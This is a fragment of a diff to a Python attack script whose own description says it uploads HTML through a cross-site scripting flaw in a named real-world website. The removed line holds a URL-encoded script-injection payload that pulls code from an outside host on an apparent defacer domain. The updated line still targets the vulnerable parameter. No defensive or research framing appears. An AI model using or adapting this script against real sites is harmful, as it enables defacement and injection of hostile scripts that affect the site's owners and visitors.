@@ -20,7 +20,7 @@ requests.packages.urllib3.disable_warnings()
 
 BASE = "https://depedquezon.com.ph"
 
-XSS_URL = 'https://depedquezon.com.ph/?result=%3Cscript+src%3D%22https%3A%2F%2Fjso.defacer.id%2Fraw%2Fnc91wdsbZ7%22%3E%3C%2Fscript%3E'
+XSS_URL = 'https://depedquezon.com.ph/?result='
 
 def main():
     parser = argparse.ArgumentParser(description="Upload HTML via depedquezon XSS")
